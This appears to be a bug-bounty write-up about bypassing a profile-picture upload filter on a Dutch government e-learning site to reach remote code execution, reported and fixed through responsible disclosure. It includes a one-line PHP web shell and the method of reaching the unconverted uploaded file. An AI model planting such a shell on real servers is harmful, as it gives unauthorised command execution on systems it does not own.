## Introduction

Assalamu Alaikum! This is Nayeem Islam. Iâ€™m currently an undergrad student and a passionate webapp security learner from Bangladesh.

This is my first write-up and Iâ€™ll be sharing how I bypassed File upload to achieve Remote Code Execution (RCE) vulnerability on a Dutch government website. You can skip my background story and head to the exploitation part ahead.

## Background
My bug bounty journey started in September 2021. That time, I saw a few researchers sharing a picture of a cool black T-shirt on Twitter. Since then, itâ€™s been my dream to get Dutch government swag.

I began my journey by targeting low-hanging fruits, often receiving informative or non-applicable responses on platforms like HackerOne. I kept trying and finally found my first valid bug in April 2022 and it worked like a motivation to test my luck with Dutch government websites.

## Recon
I gathered some articles about hacking the Dutch government to get an initial idea of the process. Reading those articles, I learned that they only offer swags for impactful bugs, ruling out any low-hanging fruits.

Googled for scopes and found this [repository](https://gist.github.com/testerzs/cf3085ec0bad6b1d661887d4f44e3574). I found a site related to healthcare. At the time, my recon skills were fairly basic, limited to subdomain enumeration.

I found a single live subdomain using `crt.sh`. It was an e-learning platform where anyone can sign-up. So, I chose this as my target because more functionality increase the possibility of finding more bugs.

Additionally, I noticed the e-learning portal was built using the PHP Laravel framework which further fueled my anticipation of finding a bug.

## File Upload Bypass
So my target was `elearning.example.nl`. I registered an account, explored my profile and tested for XSS, HTML injection, CSRF, but came up empty-handed.

Then I started testing profile picture upload feature. I tried uploading a simple `test.txt` file & the upload was successful. However, my joy was vanished as I discovered the following error when attempting to view the uploaded image.

`There is an error with this image file`

Have a close look at the URL structure. You can see below my `txt` file has been renamed and converted to `jpg` as well. ðŸ˜¥

I tried IDOR on this endpoint `/storage/52` because this number was user identifier & sequential. It didnâ€™t work. I took a short break to recharge myself then revisited the target.

This time I paid close attention to the sub directory `conversions` in the URL. I asked myself what the hell is this directory doing here? **They might be storing my original text file in the `/528/` directory then converting it to jpg and saving it to `conversions`.**

So, I attempted to access the uploaded text file directly from `/528/`, resulting in a URL like this
`https://elearning.example.nl/528/my-image.txt`
My assumption was right. The TXT file executed! I documented my findings with a Proof of Concept (PoC) and submitted my initial report.

Meanwhile, I was exploring ways to further exploit the file upload feature and I came across this excellent [article](https://sm4rty.medium.com/hunting-for-bugs-in-file-upload-feature-c3b364fb01ba).

## Exploiting RCE
Later, I learned about how File Upload can be exploited to achieve RCE. Then I uploaded this simple one liner PHP shell to see whether it works.  

```php
<?php system($_GET['cmd']); ?>
```

Opened profile image in a new tab and modified the URL with RCE command. The outcome? VoilÃ Ã Ã ! I had successfully achieved Remote Code Execution. ðŸ˜Ž

Send additional report to prove the impact of this newfound vulnerability.

## End Story
I was happy and hopeless at the same time. This discovery seemed too easy, raising the possibility of it being a duplicate. To my surprise, my report was triaged! NCSC-NL also advised me not to upload shell on their system!

Before this discovery, I had never completed a single Portswigger lab on File Upload or Command Execution, except for basic TryHackMe rooms.

This issue was resolved within a month and I was awarded the dream Swag! It was my first critical finding on a real target as well as my first ever bug submission on the Dutch Government. I thought I was lucky but I was wrong. My swag got lost in the shipment. ðŸ˜ž

They say, 
> Enjoy the journey, not just the destination. 

How true that turned out to be. I learned a ton of lessons throughout this journey.
